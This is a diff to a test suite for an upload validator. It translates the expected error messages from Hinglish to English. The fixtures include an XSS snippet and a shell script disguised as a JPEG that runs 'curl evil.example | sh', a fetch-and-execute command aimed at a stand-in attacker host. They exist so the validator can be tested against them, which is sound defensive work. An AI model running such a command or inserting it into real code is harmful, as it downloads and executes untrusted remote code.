@@ -60,7 +60,7 @@ describe('upload content validation', () => {
     const html = Buffer.from('<script>alert(1)</script>');
     expect(() =>
       validateUpload(upload('x.html', 'text/html', html), html, CONSTRAINTS.image),
-    ).toThrowError(/allowed nahi/i);
+    ).toThrowError(/not allowed/i);
   });
 
   it('refuses an extension that disagrees with the declared type', () => {
@@ -80,26 +80,26 @@ describe('upload content validation', () => {
     const script = Buffer.from('#!/bin/sh\ncurl evil.example | sh\n');
     expect(() =>
       validateUpload(upload('holiday.jpg', 'image/jpeg', script), script, CONSTRAINTS.image),
-    ).toThrowError(/content uske type se match nahi/i);
+    ).toThrowError(/do not match its type/i);
   });
 
   it('refuses a PNG body declared as a JPEG', () => {
     expect(() =>
       validateUpload(upload('shot.jpg', 'image/jpeg', PNG), PNG, CONSTRAINTS.image),
-    ).toThrowError(/content uske type se match nahi/i);
+    ).toThrowError(/do not match its type/i);
   });
 
   it('refuses an empty file', () => {
     const empty = Buffer.alloc(0);
     expect(() =>
       validateUpload(upload('empty.jpg', 'image/jpeg', empty), empty, CONSTRAINTS.image),
-    ).toThrowError(/khali/i);
+    ).toThrowError(/empty/i);
   });
 
   it('refuses a declared size that does not match the bytes received', () => {
     expect(() =>
       validateUpload({ name: 'a.jpg', type: 'image/jpeg', size: 10 }, JPEG, CONSTRAINTS.image),
-    ).toThrowError(/size declared size se match nahi/i);
+    ).toThrowError(/does not match the size declared/i);
   });
 
   it('enforces the per-purpose size ceiling', () => {
@@ -122,7 +122,7 @@ describe('upload content validation', () => {
     ).toEqual({ mimeType: 'application/pdf' });
     expect(() =>
       validateUpload(upload('cnic.pdf', 'application/pdf', PDF), PDF, CONSTRAINTS.image),
-    ).toThrowError(/allowed nahi/i);
+    ).toThrowError(/not allowed/i);
   });
 });
 
